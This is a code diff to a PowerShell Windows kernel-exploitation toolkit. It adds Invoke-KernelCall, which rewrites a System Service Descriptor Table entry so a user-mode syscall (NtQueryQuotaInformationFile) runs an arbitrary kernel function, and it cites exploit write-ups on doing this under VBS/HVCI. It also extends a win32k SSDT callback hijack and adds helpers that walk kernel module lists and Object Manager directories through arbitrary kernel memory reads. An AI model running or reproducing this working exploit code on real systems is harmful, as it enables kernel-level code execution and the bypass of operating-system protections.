@@ -240,6 +240,13 @@ $PA = Invoke-SsdtCallbackHijack `
 if ($PA -notin @(0,1)) {
     "PA: 0x{0:X16}" -f $PA
 }
+$PA = Invoke-KernelCall `
+    -Function MmGetPhysicalAddress `
+    -Values @($KernelVA) `
+    -ReturnMode Int64
+if ($PA -notin @(0,1)) {
+    "PA: 0x{0:X16}" -f $PA
+}
 
 Write-Host
 return
@@ -5690,7 +5697,7 @@ function Resolve-SymbolFromPdb {
     # 3. Handle local cache check or download
     $destination = Join-Path $DownloadFolder "$pdbName\$guid$age\$pdbName"
     if (-not (Test-Path $destination)) {
-        Write-Host "PDB missing locally. Downloading..." -ForegroundColor Yellow
+        Write-warning "PDB missing locally. Downloading..." -ForegroundColor Yellow
         New-Item -ItemType Directory -Path (Split-Path $destination) -Force | Out-Null
         $url = "https://msdl.microsoft.com/download/symbols/$pdbName/$guid$age/$pdbName"
         Invoke-WebRequest -Uri $url -OutFile $destination -UserAgent "Microsoft-Symbol-Server/10.0.0.0"
@@ -5794,8 +5801,58 @@ function Resolve-DriverAddress {
     }
     throw "Could not retrieve runtime kernel base address for $DriverName"
 }
+function Resolve-KernelDriverAddress {
+    [CmdletBinding()]
+    param (
+        [Parameter(Mandatory = $true, Position = 0)]
+        [string]$DriverName
+    )
+
+    $KernelBase = Get-KernelBaseAddress
+    $LoadedModuleOffset = Resolve-SymbolFromPdb -BinaryPath C:\Windows\System32\ntoskrnl.exe -FunctionName PsLoadedModuleList
+
+    if ($KernelBase -eq [IntPtr]::Zero -or -not $LoadedModuleOffset) {
+        Write-Error "Failed to resolve Kernel Base or PsLoadedModuleList offset."
+        return [IntPtr]::Zero
+    }
+
+    $ListHead = [IntPtr]::Add($KernelBase, $LoadedModuleOffset).ToInt64()
+    $NtData = Read-VirtualAddress -VA $ListHead -BlockSize 8
+    if ($null -eq $NtData) { return [IntPtr]::Zero }
+
+    # Start directly at the first module entry
+    $CurrentEntry = [BitConverter]::ToInt64($NtData, 0)
+
+    # Loop runs until we circle back to the List Head or hit a null pointer
+    while ($CurrentEntry -ne $ListHead -and $CurrentEntry -ne 0) {
+        $ModuleData = Read-VirtualAddress -VA $CurrentEntry -BlockSize 104
+        if ($null -eq $ModuleData -or $ModuleData.Length -lt 104) { break }
+
+        # Offsets: DllBase = 48, NameLength = 88, NameBufferPtr = 96
+        $DllBase       = [BitConverter]::ToInt64($ModuleData, 48)
+        $NameLength    = [BitConverter]::ToUInt16($ModuleData, 88)
+        $NameBufferPtr = [BitConverter]::ToInt64($ModuleData, 96)
+
+        if ($NameBufferPtr -ne 0 -and $NameLength -gt 0) {
+            $StringBytes = Read-VirtualAddress -VA $NameBufferPtr -BlockSize $NameLength
+            if ($null -ne $StringBytes) {
+                $CurrentDriverName = [System.Text.Encoding]::Unicode.GetString($StringBytes)
+                if ($CurrentDriverName -eq $DriverName) {
+                    return [IntPtr]$DllBase
+                }
+            }
+        }
+
+        # Advance to the next Flink (Offset 0)
+        $CurrentEntry = [BitConverter]::ToInt64($ModuleData, 0)
+    }
+
+    Write-Error "Could not retrieve address for $DriverName"
+    return [IntPtr]::Zero
+}
 #endregion
 #region Helper
+# NtBuild
 function Get-NtBuildNumber {
     $KernelBase = Get-KernelBaseAddress
     
@@ -5977,6 +6034,283 @@ function Spoof-NtBuildNumber {
 
     Write-Host "--------------------------------------------------------" -ForegroundColor Gray
     Write-Host "[*] Custom Target Execution Pipeline Terminated." -ForegroundColor Cyan
+}
+#ObjectManager
+<#
+Clear-Host
+Write-Host
+
+# V1, Using API, limited Info
+#Get-ObjectManagerDirectory -Path Device
+
+# V2, with full Driver Path
+$Devices = Dump-ObjectDirectory -FilterPath '\Device' -AsObject
+if ($Devices) {
+    # Find '\Device' root entry in our tree and output its direct children.
+    $DeviceRoot = $Devices | Where-Object { $_.FullPath -eq '\Device' }
+    if ($DeviceRoot -and $DeviceRoot.Children) {
+        foreach ($Child in $DeviceRoot.Children) {
+            $DriverPath = if ($Child.DriverDetails) { $Child.DriverDetails.FullName } else { "<No Driver Details>" }
+            Write-Host ("{0,-50} : {1}" -f $Child.Name, $DriverPath) -ForegroundColor Yellow
+        }
+    }
+}
+#>
+function Safe-Read {
+    param(
+        [long]$VA,
+        [int]$BlockSize = 8,
+        [switch]$AsLong
+    )
+    if ($VA -gt -1L -and $VA -lt -140737488355328L) {
+        return $null
+    }
+
+    try {
+        if ($AsLong) {
+            return Read-VirtualAddress -VA $VA -AsLong
+        } else {
+            return Read-VirtualAddress -VA $VA -BlockSize $BlockSize
+        }
+    } catch {
+        return $null
+    }
+}
+function Get-DriverFromDevice {
+    param (
+        [long]$DeviceBodyAddress
+    )
+
+    # Call 1: Resolve DriverObject pointer from the Device
+    $DriverObjectVA = Safe-Read -VA ($DeviceBodyAddress + 0x08) -AsLong
+    if ($null -eq $DriverObjectVA -or $DriverObjectVA -eq 0L) { return $null }
+
+    # Call 2: Read DriverSection pointer (at +0x28) 
+    $DriverSection = Safe-Read -VA ($DriverObjectVA + 0x28) -AsLong
+    if ($null -eq $DriverSection -or $DriverSection -eq 0L) {
+        return @{
+            Address  = $DriverObjectVA
+            Name     = "<No Section>"
+            FullName = "<No Section>"
+        }
+    }
+
+    # Call 3: Read FullDllName (UNICODE_STRING) at DriverSection + 0x48.
+    # Length (2 bytes), MaximumLength (2 bytes), Padding (4 bytes), Buffer Pointer (8 bytes) = 16 bytes.
+    $PathInfoBytes = Safe-Read -VA ($DriverSection + 0x48) -BlockSize 16
+    if ($null -eq $PathInfoBytes) { return $null }
+
+    $FullPathLength = [BitConverter]::ToUInt16($PathInfoBytes, 0)
+    $FullPathVA     = [BitConverter]::ToInt64($PathInfoBytes, 8)
+
+    $DriverPath = "<Unknown Path>"
+    $DriverName = "<Unknown>"
+
+    # Call 4: Read the string payload
+    if ($FullPathVA -ne 0L -and $FullPathLength -gt 0) {
+        # Fast clamp to avoid runaway reads
+        $ReadPathLength = if ($FullPathLength -lt 512) { $FullPathLength } else { 512 }
+        $PathBytes = Safe-Read -VA $FullPathVA -BlockSize $ReadPathLength
+        if ($null -ne $PathBytes) {
+            $DriverPath = [System.Text.Encoding]::Unicode.GetString($PathBytes)
+            
+            # Fast split
+            $lastSlash = $DriverPath.LastIndexOf('\')
+            $DriverName = if ($lastSlash -ge 0) { $DriverPath.Substring($lastSlash + 1) } else { $DriverPath }
+        }
+    }
+
+    # Returning a raw Hashtable is significantly faster than instantiating PSCustomObject inside deep loops
+    return @{
+        Address  = $DriverObjectVA
+        Name     = $DriverName
+        FullName = $DriverPath
+    }
+}
+function Dump-ObjectDirectory {
+    param(
+        [long]$DirAddress,
+        [string]$ParentPath = "\",
+        [int]$IndentLevel = 0,
+        [switch]$AsObject,
+        [string]$FilterPath
+    )
+
+    if ($IndentLevel -eq 0) {
+        $script:VisitedDirectories = [System.Collections.Generic.HashSet[long]]::new()
+        $KernelBase = Get-KernelBaseAddress
+        $ObpRootSym = Resolve-SymbolFromPdb `
+            -BinaryPath C:\Windows\System32\ntoskrnl.exe `
+            -FunctionName ObpRootDirectoryObject
+
+        $RootDirectoryAddress = Safe-Read -VA ([Intptr]::Add($KernelBase, $ObpRootSym)) -AsLong
+        if ($null -eq $RootDirectoryAddress -or $RootDirectoryAddress -eq 0L) {
+            Write-Error "Could not read Root Directory address!"
+            return
+        }
+        $DirAddress = $RootDirectoryAddress
+    }
+
+    if ($script:VisitedDirectories.Contains($DirAddress)) { 
+        return
+    }
+    $script:VisitedDirectories.Add($DirAddress) | Out-Null
+
+    $Indent = "  " * $IndentLevel
+    $CollectedItems = [System.Collections.Generic.List[PSCustomObject]]::new()
+
+    # --- OPTIMIZATION 1: Single Bulk Read for all 37 Directory Buckets ---
+    # Instead of making 37 individual driver calls, we pull all 296 bytes (37 * 8) at once.
+    $DirectoryBucketsBytes = Safe-Read -VA $DirAddress -BlockSize 296
+    if ($null -eq $DirectoryBucketsBytes) {
+        return
+    }
+
+    for ($BucketIndex = 0; $BucketIndex -lt 37; $BucketIndex++) {
+        # Parse the bucket pointer directly from local memory (offset: index * 8)
+        $EntryAddress = [BitConverter]::ToInt64($DirectoryBucketsBytes, ($BucketIndex * 8))
+        if ($EntryAddress -eq 0L) { continue }
+        
+        $ChainTracker = [System.Collections.Generic.HashSet[long]]::new()
+        
+        while ($EntryAddress -ne 0L) {
+            if ($ChainTracker.Contains($EntryAddress)) {
+                if (-not $AsObject) {
+                    Write-Host ("{0,-8} | [LOOP DETECTED] Entry 0x{1:X16} pointed back to itself! Breaking." -f $BucketIndex, $EntryAddress) -ForegroundColor DarkYellow
+                }
+                break
+            }
+            $ChainTracker.Add($EntryAddress) | Out-Null
+
+            # Read the _OBJECT_DIRECTORY_ENTRY (16 bytes)
+            $EntryBytes = Safe-Read -VA $EntryAddress -BlockSize 16
+            if ($null -eq $EntryBytes) {
+                if (-not $AsObject) {
+                    Write-Host ("{0,-8} | [FAULT] Read failed at Entry 0x{1:X16}" -f $BucketIndex, $EntryAddress) -ForegroundColor Red
+                }
+                break 
+            }
+
+            $ChainLink  = [BitConverter]::ToInt64($EntryBytes, 0)
+            $ObjectBody = [BitConverter]::ToInt64($EntryBytes, 8)
+            $ObjectHeaderVA = $ObjectBody - 0x30
+
+            # Bulk read consolidated header chunk (112 bytes)
+            $BulkStartVA = $ObjectHeaderVA - 0x40
+            $BulkBytes = Safe-Read -VA $BulkStartVA -BlockSize 112
+
+            if ($null -eq $BulkBytes) {
+                $HexEntry = "0x{0:X16}" -f $EntryAddress
+                $HexBody  = "0x{0:X16}" -f $ObjectBody
+                if (-not $AsObject) {
+                    Write-Host ("{0,-8} | {1,-18} | {2,-18} | {3}" -f $BucketIndex, $HexEntry, $HexBody, ($Indent + "<Page Fault / Unreadable Header>")) -ForegroundColor Red
+                }
+                $EntryAddress = $ChainLink
+                continue
+            }
+
+            $InfoMask = $BulkBytes[0x5B]
+            $ObjectName = ""
+            $Offset = 0
+            if (($InfoMask -band 0x01) -ne 0) { $Offset += 0x20 } 
+            
+            if (($InfoMask -band 0x02) -ne 0) { 
+                $Offset += 0x20
+                $NameInfoBufferIndex = 0x40 - $Offset
+                $NameLength = [BitConverter]::ToUInt16($BulkBytes, $NameInfoBufferIndex + 8)
+                $NameBufferVA = [BitConverter]::ToInt64($BulkBytes, $NameInfoBufferIndex + 16)
+                
+                if ($NameBufferVA -ne 0L -and $NameLength -gt 0) {
+                    $ReadLength = [System.Math]::Min($NameLength, 512)
+                    $StringBytes = Safe-Read -VA $NameBufferVA -BlockSize $ReadLength
+                    if ($null -ne $StringBytes) {
+                        $ObjectName = [System.Text.Encoding]::Unicode.GetString($StringBytes)
+                    } else {
+                        $ObjectName = "<Unreadable Name Buffer>"
+                    }
+                } else {
+                    $ObjectName = "<Unnamed>"
+                }
+            } else {
+                $ObjectName = "<No NameInfo>"
+            }
+
+            # Build absolute path
+            $CurrentPath = if ($ParentPath -eq "\") { "\$ObjectName" } else { "$ParentPath\$ObjectName" }
+
+            # --- OPTIMIZATION 2: Early Path Tree Filtering ---
+            # Don't recurse or retrieve expensive driver details if this branch is out-of-scope of the FilterPath
+            $MatchesFilter = $true
+            if ($FilterPath) {
+                $MatchesFilter = $CurrentPath.StartsWith($FilterPath, [System.StringComparison]::OrdinalIgnoreCase) -or 
+                                 $FilterPath.StartsWith($CurrentPath, [System.StringComparison]::OrdinalIgnoreCase)
+            }
+
+            if (-not $MatchesFilter) {
+                $EntryAddress = $ChainLink
+                continue
+            }
+
+            $HexEntry = "0x{0:X16}" -f $EntryAddress
+            $HexBody  = "0x{0:X16}" -f $ObjectBody
+            
+            $IsDirectory = $false
+            $KnownDirectories = @("\Device", "\Driver", "\GLOBAL??", "\REGISTRY", "\ObjectTypes", "\Security", "\Callback", "\Sessions")
+            if (($KnownDirectories -contains $CurrentPath -or $ObjectName -eq "Sessions") -and $CurrentPath -ne "\REGISTRY") {
+                $IsDirectory = $true
+            }
+
+            if ($AsObject) {
+                $Item = [PSCustomObject]@{
+                    BucketIndex   = $BucketIndex
+                    EntryAddress  = $HexEntry
+                    BodyAddress   = $HexBody
+                    Name          = $ObjectName
+                    FullPath      = $CurrentPath
+                    Type          = if ($IsDirectory) { "Directory" } else { "Object" }
+                    DriverDetails = $null
+                    Children      = $null
+                }
+
+                # --- OPTIMIZATION 3: Lazy-Load Driver Info ---
+                # Only resolve driver details if the path is genuinely part of \Device.
+                if ($ParentPath -eq "\Device") {
+                    $Item.DriverDetails = Get-DriverFromDevice -DeviceBodyAddress $ObjectBody
+                }
+
+                if ($IsDirectory) {
+                    $Item.Children = Dump-ObjectDirectory -DirAddress $ObjectBody -ParentPath $CurrentPath -IndentLevel ($IndentLevel + 1) -AsObject -FilterPath $FilterPath
+                }
+
+                $CollectedItems.Add($Item)
+            }
+            else {
+                # Classic CLI output logic
+                if ($IsDirectory) {
+                    Write-Host ("{0,-2} | {1,-18} | {2,-18} | {3}" -f $BucketIndex, $HexEntry, $HexBody, ($Indent + $CurrentPath + " [DIR]")) -ForegroundColor Cyan
+                    Dump-ObjectDirectory -DirAddress $ObjectBody -ParentPath $CurrentPath -IndentLevel ($IndentLevel + 1) -FilterPath $FilterPath
+                } else {
+                    if ($ParentPath -eq "\Device") {
+                        $DriverInfo = Get-DriverFromDevice -DeviceBodyAddress $ObjectBody
+                        if ($null -ne $DriverInfo) {
+                            $DriverOutput = " -> Driver: $($DriverInfo.Name), $($DriverInfo.FullName)"
+                            Write-Host ("{0,-2} | {1,-18} | {2,-18} | {3}" -f $BucketIndex, $HexEntry, $HexBody, ($Indent + $CurrentPath + $DriverOutput)) -ForegroundColor Green
+                        } else {
+                            Write-Host ("{0,-2} | {1,-18} | {2,-18} | {3}" -f $BucketIndex, $HexEntry, $HexBody, ($Indent + $CurrentPath)) -ForegroundColor Yellow
+                        }
+                    } else {
+                        Write-Host ("{0,-2} | {1,-18} | {2,-18} | {3}" -f $BucketIndex, $HexEntry, $HexBody, ($Indent + $CurrentPath)) -ForegroundColor Yellow
+                    }
+                }
+            }
+
+            $EntryAddress = $ChainLink
+        }
+    }
+
+    if ($AsObject) {
+        return $CollectedItems.ToArray()
+    }
 }
 function Get-ObjectManagerDirectory {
     <#
@@ -6179,6 +6513,7 @@ function Get-ObjectManagerDirectory {
         Write-Error $_.Exception.Message
     }
 }
+# Kernel Call
 function Find-RipRelativeAddress {
     param (
         [Parameter(Mandatory=$true)]
@@ -6222,6 +6557,9 @@ Function Invoke-SsdtCallbackHijack {
         [string]$Function,
         [object[]]$Values = $null,
 
+        [ValidateSet("Int8", "Int32", "Int64")]
+        [string]$ReturnMode = "Int64",
+
         [string]$Driver     = 'win32k.sys',
         [string]$Target     = 'NtUserFrostCrashedWindow',
         [Byte[]]$MovPattern = @(72, 139, 5),
@@ -6238,7 +6576,7 @@ Function Invoke-SsdtCallbackHijack {
     # 1. EXECUTE EXISTING DYNAMIC SSDT RESOLUTION
     # -----------------------------------------------------------------
 
-    $DriverBase = Resolve-DriverAddress   -DriverName $Driver
+    $DriverBase = Resolve-DriverAddress  -DriverName $Driver
     $TableRVA   = Resolve-SymbolFromFile -DllName $Driver -FunctionName W32pServiceTable       | Select -ExpandProperty RVA
     $StubRVA    = Resolve-SymbolFromFile -DllName $Driver -FunctionName "__win32kstub_$Target" | Select -ExpandProperty RVA
 
@@ -6282,15 +6620,112 @@ Function Invoke-SsdtCallbackHijack {
         
         Write-VirtualAddress -VA $LiveVariableVA -Long ([IntPtr]::Add((Get-KernelBaseAddress), $RVA)) | Out-Null      
         
-        return (
-            Invoke-UnmanagedMethod -Dll win32u -Function $Target -Return int64 -Values $Values
-        )
-        return $null
+        $Res = $null
+        if ($ReturnMode -eq "Int64") {
+            $Res = Invoke-UnmanagedMethod -Dll win32u -Function $Target -Return int64 -Values $Values
+        } elseif ($ReturnMode -eq "Int32") {
+            $Res = Invoke-UnmanagedMethod -Dll win32u -Function $Target -Return int32 -Values $Values
+        } else {
+            $Res = Invoke-UnmanagedMethod -Dll win32u -Function $Target -Return byte -Values $Values
+        }
+        return $Res
 
 
     } Finally {
         Write-VirtualAddress -VA $LiveVariableVA -Long $CallbackVA | Out-Null
     }
+}
+Function Invoke-KernelCall {
+    param (
+        [Parameter(Mandatory = $true)]
+        [ValidateNotNullOrEmpty()]
+        [string]$Function,
+        [object[]]$Values = $null,
+        [ValidateSet("Int8", "Int32", "Int64")]
+        [string]$ReturnMode = "Int64"
+    )
+
+    # WinNotify: Building Kernel Read/Write from CR3-Based IOCTLs
+    # https://www.exploitpack.com/blogs/news/winnotify-building-kernel-read-write-from-cr3-based-ioctls
+
+    # Bypassing Kernel Code Execution: SSDT Hijack Under VBS/HVCI, but how?
+    # https://www.exploitpack.com/blogs/news/bypassing-kernel-code-execution-a-data-only-ssdt-hijack-under-hvci-but-how
+
+    $KernelBase  = Get-KernelBaseAddress
+    $TableRVA    = Resolve-SymbolFromPdb -FunctionName KeServiceDescriptorTable
+    $SysCallData = Resolve-SymbolFromFile -DllName ntdll.dll -FunctionName NtQueryQuotaInformationFile | select -ExpandProperty Bytes
+    $SysCallVal  = [System.BitConverter]::ToInt32($SysCallData, 4)
+    $ServiceBase = Read-VirtualAddress -VA ([IntPtr]::Add($KernelBase, $TableRVA)) -AsLong
+
+    $EntryAddress = [IntPtr]::Add($ServiceBase, ($SysCallVal * 4))
+    $EntryValue   = Read-VirtualAddress -VA $EntryAddress -AsInt
+    $RealOffset   = $EntryValue -shr 4
+
+    #Read-VirtualAddress -VA ([IntPtr]::Add($ServiceBase, $RealOffset)) -BlockSize 96 | 
+    #    Format-HexView -Mode 16x
+
+    $TotalParams     = if ($null -ne $Values) { $Values.Count } else { 0 }
+    $StackParams     = if ($TotalParams -gt 4) { $TotalParams - 4 } else { 0 }
+    $NewFuncRVA  = Resolve-SymbolFromPdb -FunctionName $Function
+    if ($null -eq $NewFuncRVA -or $NewFuncRVA -le 0) {
+        throw "Failed to resolve symbol for $Function"
+    }
+    $ServiceTableRVA = $ServiceBase - $KernelBase
+    $NewOffset       = (($NewFuncRVA - $ServiceTableRVA) -shl 4) -bor $StackParams
+
+    try {
+        $MapObj = Map-KernelMemory `
+            -VA $EntryAddress `
+            -Size 4 -Mode gibepext `
+            -CacheType MmCached
+        if ($MapObj.MappedAddress -ne 0) {
+            $HR = Write-VirtualAddress `
+                -VA $MapObj.MappedAddress `
+                -Int $NewOffset
+            #Write-Warning "Results: $HR"
+        }
+    } finally {
+        Free-IntPtr `
+            -handle $MapObj.Device `
+            -Method NtHandle
+    }
+    $Res = $null
+    try {
+        if ($ReturnMode -eq "Int64") {
+            $Res = Invoke-UnmanagedMethod `
+                -Dll ntdll.dll `
+                -Function NtQueryQuotaInformationFile `
+                -Values $Values -Return int64
+        } elseif ($ReturnMode -eq "Int32") {
+            $Res = Invoke-UnmanagedMethod `
+                -Dll ntdll.dll `
+                -Function NtQueryQuotaInformationFile `
+                -Values $Values -Return int32
+        } else {
+            $Res = Invoke-UnmanagedMethod `
+                -Dll ntdll.dll `
+                -Function NtQueryQuotaInformationFile `
+                -Values $Values -Return byte
+        }
+    } Finally {
+        try {
+            $MapObj = Map-KernelMemory `
+                -VA $EntryAddress `
+                -Size 4 -Mode gibepext `
+                -CacheType MmCached
+            if ($MapObj.MappedAddress -ne 0) {
+                $HR = Write-VirtualAddress `
+                    -VA $MapObj.MappedAddress `
+                    -Int $EntryValue
+                #Write-Warning "Results: $HR"
+            }
+        } finally {
+            Free-IntPtr `
+                -handle $MapObj.Device `
+                -Method NtHandle
+        }
+    }
+    return $res
 }
 #endregion
 #region Process
